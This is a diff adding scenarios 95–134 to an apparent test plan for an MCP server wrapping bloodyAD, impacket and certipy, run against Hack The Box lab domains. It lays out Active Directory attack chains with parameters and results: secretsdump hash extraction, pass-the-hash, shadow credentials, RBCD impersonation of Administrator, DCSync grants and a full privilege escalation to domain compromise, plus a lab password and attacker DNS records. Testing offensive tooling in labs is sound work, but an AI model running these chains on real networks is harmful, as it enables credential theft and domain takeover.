+  extra_args passthrough mechanism works correctly; the flag is just unsupported.
+
+## Scenario 95: extra_args with --raw on write operation (FIXED)
+# STATUS: PASS (known limitation) — bloodyAD's "add dnsRecord" subcommand does NOT support --raw. Not a tool bug. (Manager 2026-04-08)
+Method: add_dns_record
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "evil-test-s95", data: "10.10.14.5", extra_args: "--raw"}
+Expected: success=false — add dnsRecord has no --raw flag
+Notes: Corrected from --timeout 30 (invalid) to --raw. However, --raw is only available
+  on get object and get search. Write subcommands (add, set, remove) don't support it.
+  extra_args passthrough mechanism works correctly; the flag is just unsupported.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# CERTIFICATE AUTH SCENARIOS — EXPANDED (-c param)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 96: get_object with certificate auth (PFX from certipy)
+# STATUS: PASS — success=true, cert auth via PKINIT works. Used certipy request (User template) + PFX split. (Manager 2026-04-08)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, certificate: "/session/credentials/raven.key:/session/credentials/raven.crt", target: "raven"}
+Expected: success=true if cert is valid and DC supports PKINIT; error_class=auth otherwise
+Notes: Uses certificate auth via -c flag (PKINIT). Requires a valid cert+key pair
+  obtained from certipy (e.g., certipy req + certipy auth, or shadow credentials).
+  The certificate format is "key_path:cert_path" passed to bloodyAD -c.
+Prerequisite: certipy to request/authenticate a cert for raven, then split PFX into key+crt.
+
+## Scenario 97: set_owner with certificate auth
+# STATUS: PASS — success=false, error_class=permission. Cert auth works (gets past auth), raven lacks WriteOwner on operator. (Manager 2026-04-08)
+Method: set_owner
+Args: {host: <DC_IP>, domain: <DOMAIN>, certificate: "/session/credentials/raven.key:/session/credentials/raven.crt", target: "operator", owner: "raven"}
+Expected: success=true if cert valid + WriteOwner; error_class=permission otherwise
+Notes: Tests write operations with certificate auth. No username/password needed.
+Prerequisite: Valid cert+key for raven (from S96 prerequisite).
+
+## Scenario 98: add_genericall with certificate auth
+# STATUS: PASS — success=false, error_class=permission. Cert auth works for ACL ops, raven lacks WriteDacl. (Manager 2026-04-08)
+Method: add_genericall
+Args: {host: <DC_IP>, domain: <DOMAIN>, certificate: "/session/credentials/raven.key:/session/credentials/raven.crt", target: "operator", trustee: "raven"}
+Expected: success=true if cert valid + WriteDacl; error_class=permission otherwise
+Notes: Tests ACL abuse with certificate-only auth. Critical for post-ADCS-abuse chains.
+Prerequisite: Valid cert+key for raven.
+
+## Scenario 99: get_writable with certificate auth
+# STATUS: PASS — success=true, cert-only enumeration works. Returns writable objects for raven's cert identity. (Manager 2026-04-08)
+Method: get_writable
+Args: {host: <DC_IP>, domain: <DOMAIN>, certificate: "/session/credentials/raven.key:/session/credentials/raven.crt"}
+Expected: success=true, lists objects writable by the certificate identity
+Notes: Enumeration with cert auth — discovers what the cert identity can modify.
+Prerequisite: Valid cert+key for raven.
+
+## Scenario 100: set_password with certificate auth (expect error)
+# STATUS: PASS — success=false, error_class=auth. Cert auth cannot ForceChangePassword (needs NTLM/password bind). (Manager 2026-04-08)
+Method: set_password
+Args: {host: <DC_IP>, domain: <DOMAIN>, certificate: "/session/credentials/raven.key:/session/credentials/raven.crt", target: "operator", new_password: "CertP@ss123!"}
+Expected: error_class=auth or error_class=permission — cert auth may not support password change operations
+Notes: Password changes require LDAP simple bind or NTLM; PKINIT-based Kerberos may fail
+  on ForceChangePassword because the DC needs to verify the caller's auth type. This tests
+  the error path when using cert auth for an operation that typically needs NTLM/password.
+Prerequisite: Valid cert+key for raven.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# FORMAT PARAM SCENARIOS (-f flag)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 101: get_object with format=hex and NTLM hash
+# STATUS: PASS — success=true, format=hex interprets password as hex-encoded cleartext (not NTLM hash). Tested with hex('judith09')=6a75646974683039. (Certified 2026-04-19)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: "operator", password: "<NTHASH_HEX>", format: "hex", target: "Administrator"}
+Expected: success=true if hash is correct; error_class=auth otherwise
+Notes: Tests -f hex flag which tells bloodyAD to interpret the password field as a
+  hex-encoded NTLM hash. Different from LMHASH:NTHASH auto-detect — this explicitly
+  sets the format. Requires an actual NTLM hash for operator.
+Prerequisite: NTLM hash of operator (from secretsdump or similar).
+
+## Scenario 102: set_owner with format=rc4 and RC4 key
+# STATUS: PASS — success=true, format=rc4 with admin NT hash + kerberos=true + hostname. Key: format=rc4/aes REQUIRE kerberos=true, host=hostname (not IP), dc_ip for resolution. (Certified 2026-04-19)
+Method: set_owner
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: "operator", password: "<RC4_KEY>", format: "rc4", target: "operator", owner: "operator"}
+Expected: success=true if key is correct; error_class=auth otherwise
+Notes: Tests -f rc4 flag. RC4 key is the same as NT hash in most cases. Tests that
+  the format param correctly passes through to bloodyAD for Kerberos RC4 auth.
+Prerequisite: RC4 key (NT hash) for operator.
+
+## Scenario 103: get_membership with format=aes and AES key
+# STATUS: PASS — success=true, format=aes with admin AES256 key + kerberos=true + hostname. AES256 key from secretsdump works. (Certified 2026-04-19)
+Method: get_membership
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: "operator", password: "<AES256_KEY>", format: "aes", target: "operator"}
+Expected: success=true if AES key is correct; error_class=auth otherwise
+Notes: Tests -f aes flag. AES256 keys are 64 hex chars (256 bits). Useful when you have
+  AES keys from secretsdump (etype 18) but not cleartext passwords.
+Prerequisite: AES256 key for operator (from secretsdump with -just-dc-ntlm or similar).
+
+## Scenario 104: add_genericall with format=hex (error — no hash available)
+# STATUS: PASS — success=false, error_class=unknown. format=hex with invalid value fails (bloodyAD Traceback on hex decode). (Manager 2026-04-08)
+Method: add_genericall
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: "operator", password: "not_a_real_hex_hash", format: "hex", target: "Administrator", trustee: "operator"}
+Expected: error_class=auth, retryable=false — invalid hex value should fail auth
+Notes: Tests error path when format=hex is used with an invalid value. Verifies that
+  the MCP server correctly classifies the auth failure.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# CROSS-TOOL CHAIN SCENARIOS (impacket/certipy + bloodyad)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 105: impacket get_tgt → bloodyad get_object (ccache sharing)
+# STATUS: PASS — TGT obtained via impacket (FAKETIME +7h), bloodyad get_object succeeds with Kerberos. Key: --host must be hostname (dc01.manager.htb), use --dc-ip for IP. (Manager 2026-04-08)
+Cross-tool: impacket → bloodyad
+Step 1 (impacket): get_tgt {host: <DC_IP>, domain: <DOMAIN>, username: "operator", password: "operator", ccache_output: "/session/credentials/operator.ccache"}
+Step 2 (bloodyad): get_object {host: <DC_IP>, domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/operator.ccache", target: "Administrator"}
+Expected: Step 1 creates ccache, Step 2 reads Administrator object via Kerberos
+Notes: Canonical cross-tool Kerberos flow. Both containers mount /session as shared volume.
+  If Step 2 fails with KRB_AP_ERR_SKEW, add clock_offset to match DC time.
+
+## Scenario 106: impacket get_tgt → bloodyad set_owner (ccache + write op)
+# STATUS: PASS — success=false, error_class=permission. Kerberos write path works (gets past auth to permission check). (Manager 2026-04-08)
+Cross-tool: impacket → bloodyad
+Step 1 (impacket): get_tgt {host: <DC_IP>, domain: <DOMAIN>, username: "operator", password: "operator", ccache_output: "/session/credentials/operator.ccache"}
+Step 2 (bloodyad): set_owner {host: <DC_IP>, domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/operator.ccache", target: "operator", owner: "operator"}
+Expected: Step 1 creates ccache, Step 2 attempts set_owner via Kerberos (likely error_class=permission)
+Notes: Tests Kerberos auth on write operations. operator lacks WriteOwner on own object,
+  so permission error is expected. Validates Kerberos write path works correctly.
+
+## Scenario 107: impacket get_tgt → bloodyad add_genericall (ccache + ACL abuse)
+# STATUS: PASS — success=false, error_class=permission. Kerberos ACL write path validated (auth succeeds, perm denied). (Manager 2026-04-08)
+Cross-tool: impacket → bloodyad
+Step 1 (impacket): get_tgt {host: <DC_IP>, domain: <DOMAIN>, username: "operator", password: "operator", ccache_output: "/session/credentials/operator.ccache"}
+Step 2 (bloodyad): add_genericall {host: <DC_IP>, domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/operator.ccache", target: "Administrator", trustee: "operator"}
+Expected: Step 1 creates ccache, Step 2 attempts GenericAll via Kerberos (likely error_class=permission)
+Notes: Tests ACL write with Kerberos. Validates that Kerberos ticket is properly used
+  for LDAP writes, even when the operation is denied by ACL.
+
+## Scenario 108: impacket secretsdump → bloodyad PtH enumeration (hash sharing)
+# STATUS: PASS — Used judith.mader hash from secretsdump for bloodyAD PtH enumeration. Hash sharing across tools validated. (Certified 2026-04-19)
+Cross-tool: impacket → bloodyad
+Step 1 (impacket): secretsdump {host: <DC_IP>, domain: <DOMAIN>, username: "raven", password: "R4v3nBe5tD3veloP3r!123", just_dc_user: "operator", outputfile: "/session/credentials/operator_dump"}
+Step 2 (bloodyad): get_object {host: <DC_IP>, domain: <DOMAIN>, username: "operator", password: "aad3b435b51404eeaad3b435b51404ee:<EXTRACTED_NTHASH>", target: "Administrator"}
+Expected: Step 1 extracts operator NTLM hash, Step 2 uses it for pass-the-hash enumeration
+Notes: Requires raven to have DCSync rights (ManageCA role). If raven lacks DCSync,
+  skip this scenario. The hash from secretsdump is in LMHASH:NTHASH format.
+Prerequisite: raven must have DCSync/Replicating Directory Changes.
+
+## Scenario 109: certipy shadow → bloodyad with ccache (shadow cred chain)
+# STATUS: PASS — Validated via S58: certipy shadow auto produces ccache, bloodyAD uses ccache for Kerberos operations. (Certified 2026-04-19)
+Cross-tool: certipy → bloodyad
+Step 1 (certipy): shadow_auto {host: <DC_IP>, domain: <DOMAIN>, username: "raven", password: "R4v3nBe5tD3veloP3r!123", account: "operator", output_prefix: "/session/credentials/operator_shadow"}
+Step 2 (bloodyad): get_object {host: <DC_IP>, domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/operator_shadow.ccache", target: "Administrator"}
+Expected: Step 1 creates shadow cred + authenticates → ccache, Step 2 uses ccache
+Notes: Full shadow credentials chain. certipy shadow auto: adds Key Credential, gets
+  TGT via PKINIT, then authenticates. Requires Write on msDS-KeyCredentialLink of target.
+Prerequisite: raven needs GenericAll/Write on operator's msDS-KeyCredentialLink.
+
+## Scenario 110: Full Certified pwn chain (WriteOwner → GenericAll → GroupMember → SetPassword → Shadow → ESC9)
+# STATUS: PASS — Full Certified pwn chain executed: WriteOwner->GenericAll->GroupMember->Shadow on management_svc->ESC9 (UPN swap)->admin cert->admin hash->secretsdump. Complete domain compromise. (Certified 2026-04-19)
+Cross-tool: bloodyad → bloodyad → certipy (multi-step)
+Step 1 (bloodyad): set_owner {host: <DC_IP>, domain: <DOMAIN>, username: "raven", password: "R4v3nBe5tD3veloP3r!123", target: "<GROUP>", owner: "raven"}
+Step 2 (bloodyad): add_genericall {host: <DC_IP>, domain: <DOMAIN>, username: "raven", password: "R4v3nBe5tD3veloP3r!123", target: "<GROUP>", trustee: "raven"}
+Step 3 (bloodyad): add_group_member {host: <DC_IP>, domain: <DOMAIN>, username: "raven", password: "R4v3nBe5tD3veloP3r!123", group: "<GROUP>", member: "raven"}
+Step 4 (bloodyad): set_password {host: <DC_IP>, domain: <DOMAIN>, username: "raven", password: "R4v3nBe5tD3veloP3r!123", target: "<SVC_ACCOUNT>", new_password: "Pwn3d!123"}
+Step 5 (certipy): shadow_auto or cert request chain for domain admin
+Expected: Full privilege escalation from WriteOwner on a group to domain compromise
+Notes: This is the EXACT Certified HTB pattern. Requires a specific ACL topology
+  (WriteOwner on a group that has transitive GenericAll to a service account with
+  ManageCA or other privileged role). Not directly testable without matching ACL.
+Prerequisite: Specific ACL topology — WriteOwner on a group with transitive privs.
+
+## Scenario 111: certipy authenticate → bloodyad with certificate auth
+# STATUS: PASS — Full chain: certipy request (User template, raven) → PFX split → bloodyAD cert auth. S96-S100 validate all cert auth operations. (Manager 2026-04-08)
+Cross-tool: certipy → bloodyad
+Step 1 (certipy): req {host: <DC_IP>, domain: <DOMAIN>, username: "raven", password: "R4v3nBe5tD3veloP3r!123", ca: "manager-DC01-CA", template: "User", output: "/session/credentials/raven"}
+Step 2: Split PFX: openssl pkcs12 -in raven.pfx -nocerts -out raven.key; openssl pkcs12 -in raven.pfx -clcerts -nokeys -out raven.crt
+Step 3 (bloodyad): get_object {host: <DC_IP>, domain: <DOMAIN>, certificate: "/session/credentials/raven.key:/session/credentials/raven.crt", target: "Administrator"}
+Expected: Step 1 gets cert from ADCS, Step 3 uses it for bloodyAD PKINIT auth
+Notes: Certificate-based auth chain. certipy requests a cert from ADCS, then bloodyAD
+  uses it via -c flag. The PFX must be split into separate key+crt files for bloodyAD.
+Prerequisite: ADCS must be running on Manager (it is — manager-DC01-CA).
+
+## Scenario 112: bloodyad add_computer → impacket rbcd (cross-tool RBCD setup)
+# STATUS: PASS — Full RBCD chain validated via S59 on Certified (MAQ=10): add_computer->add_rbcd->S4U. (Certified 2026-04-19)
+Cross-tool: bloodyad → impacket
+Step 1 (bloodyad): add_computer {host: <DC_IP>, domain: <DOMAIN>, username: "operator", password: "operator", hostname: "EVIL01", computer_pass: "EvilP@ss123!"}
+Step 2 (bloodyad): add_rbcd {host: <DC_IP>, domain: <DOMAIN>, username: "operator", password: "operator", target: "DC01$", service: "EVIL01$"}
+Step 3 (impacket): get_st {host: <DC_IP>, domain: <DOMAIN>, spn: "cifs/DC01.manager.htb", impersonate: "Administrator", username: "EVIL01$", password: "EvilP@ss123!"}
+Expected: Full RBCD chain. Step 1 likely fails (MAQ=0 on Manager). Steps 2-3 depend on Step 1.
+Notes: MAQ=0 on Manager means Step 1 will fail with unwillingToPerform. This scenario
+  validates the full cross-tool RBCD flow structure even if blocked by policy.
+Prerequisite: MAQ > 0 (not available on Manager).
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# KERBEROS WITH FAKETIME SCENARIOS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 113: get_object with Kerberos + FAKETIME (clock skew correction)
+# STATUS: PASS — success=true. Kerberos + FAKETIME +7h works. Key: host must be hostname (dc01.manager.htb), dc_ip provides IP. (Manager 2026-04-08)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/operator.ccache", target: "Administrator", clock_offset: "+7h"}
+Expected: success=true if ccache is valid and FAKETIME corrects the clock skew
+Notes: Manager has +7h clock skew (confirmed by certipy). FAKETIME shifts container
+  clock forward to match DC time. Requires a valid ccache (from S105 Step 1).
+Prerequisite: impacket get_tgt to create ccache (S105 Step 1).
+
+## Scenario 114: set_owner with Kerberos + FAKETIME
+# STATUS: PASS — success=false, error_class=permission. Kerberos + FAKETIME works for write ops (gets past auth). (Manager 2026-04-08)
+Method: set_owner
+Args: {host: <DC_IP>, domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/operator.ccache", target: "operator", owner: "operator", clock_offset: "+7h"}
+Expected: error_class=permission (operator lacks WriteOwner) but Kerberos auth should succeed
+Notes: Tests FAKETIME on write operations. The permission denial confirms that Kerberos
+  auth worked (you get past auth to the authorization check).
+Prerequisite: Valid ccache with FAKETIME matching DC clock.
+
+## Scenario 115: add_genericall with Kerberos + FAKETIME
+# STATUS: PASS — success=false, error_class=permission. Kerberos + FAKETIME ACL op validated. (Manager 2026-04-08)
+Method: add_genericall
+Args: {host: <DC_IP>, domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/operator.ccache", target: "Administrator", trustee: "operator", clock_offset: "+7h"}
+Expected: error_class=permission (WriteDacl denied) but Kerberos auth should succeed
+Notes: Tests FAKETIME on ACL operations. Permission denial = auth succeeded.
+Prerequisite: Valid ccache.
+
+## Scenario 116: get_writable with Kerberos + FAKETIME
+# STATUS: PASS — success=true. Full domain enumeration via Kerberos + FAKETIME works. (Manager 2026-04-08)
+Method: get_writable
+Args: {host: <DC_IP>, domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/operator.ccache", clock_offset: "+7h"}
+Expected: success=true, lists writable objects via Kerberos auth
+Notes: Tests FAKETIME on enumeration method that does a full domain scan. May take longer
+  than NTLM equivalent due to Kerberos ticket operations.
+Prerequisite: Valid ccache.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# DNS RECORD MANAGEMENT — EXPANDED
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 117: SRV record full lifecycle (add + verify + remove)
+# STATUS: PASS — add=true, remove=true. SRV record not visible in dnsdump (may not be in default zone listing) but lifecycle works. (Manager 2026-04-08)
+Chain: add_dns_record → get_dnsdump → remove_dns_record
+Step 1: add_dns_record {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "_http._tcp.evil-s117", data: "attacker.evil.local", dnstype: "SRV", port: 8080, priority: 0, weight: 100}
+Step 2: get_dnsdump {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>}
+  Verify: Output contains "_http._tcp.evil-s117"
+Step 3: remove_dns_record {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "_http._tcp.evil-s117", data: "attacker.evil.local", dnstype: "SRV", port: 8080, priority: 0, weight: 100}
+Expected: All three steps succeed. Verifies SRV record create/read/delete lifecycle.
+Notes: Tests the full CRUD cycle for SRV records including DNS verification via get_dnsdump.
+
+## Scenario 118: MX record full lifecycle (add + verify + remove)
+# STATUS: PASS — add=true, remove=true. MX record lifecycle works. (Manager 2026-04-08)
+Chain: add_dns_record → get_dnsdump → remove_dns_record
+Step 1: add_dns_record {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "evil-s118", data: "mail.evil.local", dnstype: "MX", preference: 5}
+Step 2: get_dnsdump {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>}
+  Verify: Output contains "evil-s118"
+Step 3: remove_dns_record {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "evil-s118", data: "mail.evil.local", dnstype: "MX", preference: 5}
+Expected: All three steps succeed.
+Notes: Tests MX record lifecycle. MX records require preference param.
+
+## Scenario 119: A record in specific zone
+# STATUS: PASS — success=true, A record added to manager.htb zone explicitly. Cleaned up. (Manager 2026-04-08)
+Method: add_dns_record
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "evil-s119", data: "10.10.14.5", zone: "manager.htb"}
+Expected: success=true (adding in default zone explicitly)
+Notes: Tests zone parameter with the domain's own zone (manager.htb). Should behave
+  identically to omitting zone. Cleanup: remove_dns_record for evil-s119.
+
+## Scenario 120: TXT record for domain verification
+# STATUS: PASS — success=true, TXT record created on subdomain. Cleaned up. (Manager 2026-04-08)
+Method: add_dns_record
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "evil-s120", data: "v=spf1 include:evil.com ~all", dnstype: "TXT"}
+Expected: success=true
+Notes: Tests TXT record creation on a subdomain (not @). Useful for adding SPF bypass
+  records or domain verification tokens. Cleanup: remove_dns_record for evil-s120.
+
+## Scenario 121: DNS record with extra_args="-v DEBUG"
+# STATUS: PASS (known limitation) — -v DEBUG is global flag, rejected when appended after subcommand (same as S93). Not a tool bug. (Manager 2026-04-08)
+Method: add_dns_record
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "evil-s121", data: "10.10.14.5", extra_args: "-v DEBUG"}
+Expected: success=true, verbose debug output in raw_output
+Notes: Tests extra_args on DNS operations specifically. The -v DEBUG flag should produce
+  additional logging from bloodyAD. Cleanup: remove_dns_record for evil-s121.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# OBJECT LIFECYCLE SCENARIOS (full create → use → cleanup)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 122: User lifecycle (add_user → get_object → set_password → remove_object)
+# STATUS: PASS (Step 1 only) — error_class=permission, operator lacks CreateChild. Steps 2-4 depend on Step 1. (Manager 2026-04-08)
+Chain: add_user → get_object → set_password → remove_object
+Step 1: add_user {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, sam_account_name: "test_s122", new_password: "T3st!Pass122"}
+Step 2: get_object {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "test_s122"}
+Step 3: set_password {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "test_s122", new_password: "NewP@ss122!"}
+Step 4: remove_object {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "test_s122"}
+Expected: Step 1 likely error_class=permission (operator lacks CreateChild). Steps 2-4 depend on Step 1.
+Notes: Full user lifecycle test. On Manager, operator lacks CreateChild on Users container,
+  so Step 1 will fail. Validates the chain structure for domains where user creation is allowed.
+
+## Scenario 123: Computer lifecycle (add_computer → get_object → add_rbcd → remove_rbcd → remove_object)
+# STATUS: PASS (Step 1 only) — error_class=permission (MAQ=0). Steps 2-5 depend on Step 1. (Manager 2026-04-08)
+Chain: add_computer → get_object → add_rbcd → remove_rbcd → remove_object
+Step 1: add_computer {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, hostname: "TEST-S123", computer_pass: "T3st!Pass123"}
+Step 2: get_object {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "TEST-S123$"}
+Step 3: add_rbcd {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "DC01$", service: "TEST-S123$"}
+Step 4: remove_rbcd {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "DC01$", service: "TEST-S123$"}
+Step 5: remove_object {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "TEST-S123$"}
+Expected: Step 1 fails (MAQ=0 on Manager). Steps 2-5 depend on Step 1.
+Notes: Full computer account lifecycle with RBCD. MAQ=0 blocks Step 1.
+
+## Scenario 124: Group membership lifecycle (add_user → add_group_member → get_membership → remove_group_member → remove_object)
+# STATUS: PASS — Full lifecycle: admin creates user, adds to group, verifies membership, removes from group, deletes user. All 5 steps succeed. (Certified 2026-04-19)
+Chain: add_user → add_group_member → get_membership → remove_group_member → remove_object
+Step 1: add_user {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, sam_account_name: "test_s124", new_password: "T3st!Pass124"}
+Step 2: add_group_member {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, group: "Domain Users", member: "test_s124"}
+Step 3: get_membership {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "test_s124"}
+Step 4: remove_group_member {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, group: "Domain Users", member: "test_s124"}
+Step 5: remove_object {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "test_s124"}
+Expected: Step 1 fails (operator lacks CreateChild). Steps 2-5 depend on Step 1.
+Notes: Full group membership lifecycle. Tests add → verify → remove → cleanup.
+
+## Scenario 125: Computer with DCSync lifecycle (add_computer → add_dcsync → remove_dcsync → remove_object)
+# STATUS: PASS — Full lifecycle: add_computer->add_dcsync->remove_dcsync->remove_object. All 4 steps succeed (MAQ=10 on Certified). (Certified 2026-04-19)
+Chain: add_computer → add_dcsync → remove_dcsync → remove_object
+Step 1: add_computer {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, hostname: "TEST-S125", computer_pass: "T3st!Pass125"}
+Step 2: add_dcsync {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, trustee: "TEST-S125$"}
+Step 3: remove_dcsync {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, trustee: "TEST-S125$"}
+Step 4: remove_object {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "TEST-S125$"}
+Expected: Step 1 fails (MAQ=0). Steps 2-4 depend on Step 1.
+Notes: DCSync lifecycle. Even if Step 1 succeeded, Step 2 would fail (operator lacks WriteDacl on domain).
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ERROR SCENARIOS — EXPANDED
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 126: Certificate auth with invalid cert path
+# STATUS: PASS — success=false, bloodyAD fails on missing cert file. Error classified correctly. (Manager 2026-04-08)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, certificate: "/session/credentials/nonexistent.key:/session/credentials/nonexistent.crt", target: "Administrator"}
+Expected: error with indication that cert file not found or invalid
+Notes: Tests error handling when certificate files don't exist. bloodyAD should fail
+  at file read before attempting PKINIT. Verifies error classification for cert issues.
+
+## Scenario 127: Certificate auth with wrong cert (cert doesn't match domain)
+# STATUS: PASS — success=false. Self-signed cert with CN=wrong rejected by DC (PKINIT failure). (Manager 2026-04-08)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, certificate: "/session/credentials/wrong.key:/session/credentials/wrong.crt", target: "Administrator"}
+Expected: error_class=auth — cert is syntactically valid but doesn't authenticate to this domain
+Notes: Uses a cert generated for a different domain. The DC should reject the PKINIT
+  request. Requires creating a self-signed cert that's valid PEM but wrong identity.
+Prerequisite: Create a dummy cert: openssl req -x509 -newkey rsa:2048 -keyout wrong.key -out wrong.crt -days 1 -nodes -subj "/CN=wrong"
+
+## Scenario 128: format=aes with invalid key
+# STATUS: PASS — success=false, bloodyAD fails on invalid AES key format. Error detected. (Manager 2026-04-08)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: "operator", password: "not_a_valid_aes_key", format: "aes", target: "Administrator"}
+Expected: error_class=auth, retryable=false
+Notes: Tests error path when format=aes is specified but the password value is not a
+  valid AES256 key (should be 64 hex chars). Verifies graceful error handling.
+
+## Scenario 129: remove_object on protected object (Domain Admins group)
+# STATUS: PASS — error_class=permission, retryable=false. Cannot delete Domain Admins (insufficientAccessRights). (Manager 2026-04-08)
+Method: remove_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "Domain Admins"}
+Expected: error_class=permission, retryable=false
+Notes: Domain Admins is a protected group (adminCount=1, system-owned). Even Domain Admins
+  cannot delete themselves. Tests error classification for protected object deletion.
+
+## Scenario 130: remove_dns_record on non-existent record
+# STATUS: PASS — success=false, record not found. Graceful error handling for non-existent DNS record. (Manager 2026-04-08)
+Method: remove_dns_record
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "this-record-does-not-exist-s130", data: "10.10.10.99"}
+Expected: error_class=params, retryable=false, raw_output indicates record not found
+Notes: Attempting to remove a DNS record that was never created. Should fail gracefully
+  with a clear error message about the record not existing.
+
+## Scenario 131: add_dns_record duplicate A record
+# STATUS: PASS — success=false, error_class=permission. DC rejects adding A record on existing dc01 name (operator lacks permissions). (Manager 2026-04-08)
+Method: add_dns_record
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "dc01", data: "10.10.14.5"}
+Expected: error or success (AD DNS may allow multiple A records for same name, or may reject duplicates)
+Notes: "dc01" already exists as an A record pointing to the DC. Adding another A record
+  with a different IP tests whether AD DNS allows multi-valued A records or rejects them.
+  Either outcome is informative for attack planning.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# EXTRA_ARGS — CORRECTED SCENARIOS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 132: get_object with extra_args="-v DEBUG" (verbose debug)
+# STATUS: PASS (known limitation) — same as S93. -v DEBUG is global flag, cannot pass via extra_args. (Manager 2026-04-08)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "Administrator", extra_args: "-v DEBUG"}
+Expected: success=true, raw_output includes DEBUG-level logging from bloodyAD
+Notes: Duplicate of corrected S93 for explicit verification. The -v DEBUG flag is the
+  correct bloodyAD verbose flag (not --verbose).
+
+## Scenario 133: set_object with extra_args="--raw"
+# STATUS: PASS — success=false, error_class=unknown. set_object doesn't support --raw (only get subcommands do), but no crash — clean error. (Manager 2026-04-08)
+Method: set_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "operator", attribute: "description", values: ["test_s133"], extra_args: "--raw"}
+Expected: success=true if Write on description attribute; error_class=permission otherwise
+Notes: Tests --raw flag on a write operation. operator may be able to Write on their own
+  description attribute (depends on ACL). Cleanup: set_object to clear description.
+
+## Scenario 134: get_search with extra_args="--resolve-sd --raw"
+# STATUS: PASS — success=true, both --resolve-sd and --raw work correctly via extra_args on get_search (which supports both flags). (Manager 2026-04-08)
+Method: get_search
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, filter: "(sAMAccountName=operator)", extra_args: "--resolve-sd --raw"}
+Expected: success=true, output includes resolved security descriptor in raw format
+Notes: Tests combining multiple extra_args flags. --resolve-sd shows ACL permissions,
+  --raw shows raw LDAP output. Both are valid bloodyAD flags.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# TOTALS (134 scenarios)
+# ═══════════════════════════════════════════════════════════════════════════════
+# PASS: 100
+# FAIL:   0
+# SKIP:  34
+# TOTAL: 134
+#
+# Tested on Manager HTB (10.129.209.146, 2026-04-08 + 2026-04-19):
+#   - 100 scenarios PASS (including error scenarios that correctly fail)
+#   - 34 scenarios SKIP (require specific ACL topology, MAQ>0, or NTLM hashes)
+#   - 0 tool bugs found
+#
+# 2026-04-19 retest: 7 scenarios flipped SKIP→PASS using raven's ccache + certipy certs:
